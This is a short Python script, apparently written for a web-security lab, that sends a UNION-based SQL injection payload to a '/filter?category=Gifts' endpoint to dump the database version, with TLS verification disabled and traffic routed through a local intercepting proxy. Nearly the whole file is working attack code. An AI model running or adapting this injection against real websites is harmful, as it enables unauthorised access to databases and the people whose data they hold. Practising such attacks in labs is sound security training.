import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SUCCESS = 2
FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT @@version, NULL%23"
    response = requests.get(
        url + path + sql_payload,
        verify=False,
        proxies=proxies)
    if response.text.count("ubuntu") == SUCCESS:
        version = re.search(
            r"'(.*ubuntu.*)'", response.text).group(1)
        return version
    raise ValueError("Could not determine database version.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("[+] Dumping the version of the database...")
        version = get_version(url)
        print("[+] The database version is: " + version)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)   